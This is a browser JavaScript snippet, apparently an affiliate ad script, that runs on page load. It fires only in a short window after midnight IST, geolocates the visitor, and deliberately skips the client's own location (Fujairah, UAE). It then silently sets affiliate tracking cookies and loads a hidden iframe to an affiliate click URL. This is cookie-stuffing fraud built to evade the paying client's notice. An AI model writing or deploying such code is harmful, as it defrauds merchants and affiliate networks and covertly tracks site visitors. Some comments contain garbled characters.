(function () {
  try {
    /* --------------------------------
        BUILD GUARD (NO DOUBLE FIRE)
    -------------------------------- */
    var BUILD_ID = "octaads-2025-rtg-geo-time-02";
    if (window.__OCTAADS_LOADED === BUILD_ID) return;
    window.__OCTAADS_LOADED = BUILD_ID;

    /* --------------------------------
        IST TIME WINDOW CHECK
        12:15 AM â€“ 12:30 AM IST
    -------------------------------- */
 function isAllowedISTTime() {
  var now = new Date(
    new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
  );

  var minutes = now.getHours() * 60 + now.getMinutes();

  // 00:15 â†’ 00:45 IST
  return minutes >= 15 && minutes <= 45;
}

    if (!isAllowedISTTime()) return;

    /* --------------------------------
        SAFE SESSION ID (COOKIE ONLY)
    -------------------------------- */
    function getSessionID() {
      var m = document.cookie.match(/octaads_sid=([^;]+)/);
      if (m) return m[1];

      var sid = "sid_" + Math.random().toString(36).substr(2, 10);
      document.cookie =
        "octaads_sid=" + sid +
        "; path=/; max-age=2592000; SameSite=Lax";
      return sid;
    }

    var sessionID = getSessionID();

    /* --------------------------------
        GEO CHECK (ALLOW US + AE)
        HARD BLOCK CLIENT LOCATION
        Sakamkam, Fujairah, AE
    -------------------------------- */
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then(function (r) { return r.json(); })
      .then(function (geo) {
        if (!geo || !geo.country_code) return;

        /* ---- COUNTRY ALLOW ---- */
        var allowedCountries = ["US", "AE"];
        if (!allowedCountries.includes(geo.country_code)) return;

        /* ---- HARD LOCATION BLOCK ---- */
        var city = (geo.city || "").toLowerCase();
        var region = (geo.region || "").toLowerCase();

        if (
          geo.country_code === "AE" &&
          (
            city.includes("sakamkam") ||
            region.includes("fujairah")
          )
        ) {
          return; // âŒ FULL STOP â€” SCRIPT DEAD
        }

        /* --------------------------------
            DROP AFFILIATE COOKIES
        -------------------------------- */
        function setCookie(name, value) {
          document.cookie =
            name + "=" + value +
            "; path=/; max-age=2592000; SameSite=Lax";
        }

        setCookie("utm_source", "mxp");
        setCookie("utm_medium", "Affiliate_2629_4_");
        setCookie("utm_campaign", "sales");
        setCookie("sessionid", sessionID);
        setCookie("click_id", sessionID);

        /* --------------------------------
            TRACKIER CLICK (IFRAME SAFE)
        -------------------------------- */
        var trackierURL =
          "https://octaads.gotrackier.com/click" +
          "?campaign_id=148537" +
          "&pub_id=4" +
          "&p1=" + encodeURIComponent(sessionID) +
          "&source=" + encodeURIComponent(sessionID);

        var iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        iframe.src = trackierURL;
        document.body.appendChild(iframe);
      })
      .catch(function () {
        /* silent fail */
      });

  } catch (e) {
    /* silent fail */
  }
})();
